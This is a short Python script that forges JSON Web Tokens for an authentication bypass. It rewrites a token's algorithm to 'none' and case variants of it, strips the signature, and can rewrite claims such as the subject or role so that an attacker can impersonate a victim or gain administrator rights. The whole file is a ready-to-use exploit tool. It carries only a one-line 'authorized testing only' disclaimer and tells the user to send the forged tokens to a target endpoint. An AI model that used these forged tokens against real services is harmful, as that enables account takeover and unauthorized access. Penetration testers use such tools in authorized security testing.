#!/usr/bin/env python3
"""
jwt_none_forge.py — build 'alg:none' and unsigned variants of a JWT to test whether a server
accepts them (algorithm-confusion / signature-not-verified).

A correct server rejects these outright. If one is accepted, the server isn't verifying the
signature — an authentication bypass. Optionally tamper with a claim to prove impersonation.

Usage:
    python3 jwt_none_forge.py <token>
    python3 jwt_none_forge.py <token> --set sub=victim --set role=admin

For authorized testing only. This forges tokens for YOUR test against a system you may test;
it doesn't break any crypto — it exercises the server's validation.
"""
import base64
import json
import sys


def b64url_decode(seg):
    return base64.urlsafe_b64decode(seg + "=" * (-len(seg) % 4))


def b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def main(argv):
    if len(argv) < 2:
        print(__doc__.strip())
        return 1
    token = argv[1]
    overrides = {}
    i = 2
    while i < len(argv):
        if argv[i] == "--set" and i + 1 < len(argv):
            k, _, v = argv[i + 1].partition("=")
            overrides[k] = v
            i += 2
        else:
            i += 1

    header = json.loads(b64url_decode(token.split(".")[0]))
    payload = json.loads(b64url_decode(token.split(".")[1]))
    payload.update(overrides)

    def enc(obj):
        return b64url_encode(json.dumps(obj, separators=(",", ":")).encode())

    for alg in ("none", "None", "nOnE"):
        h = dict(header, alg=alg)
        # 'none' tokens have an empty signature segment
        print(f"# alg={alg}")
        print(f"{enc(h)}.{enc(payload)}.")
    print("\n# header/payload only (no third segment)")
    print(f"{enc(dict(header, alg='none'))}.{enc(payload)}")
    if overrides:
        print(f"\n# claims overridden: {overrides}")
    print("\nSend each to the target's authenticated endpoint. A 200 = signature not verified.")
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv))
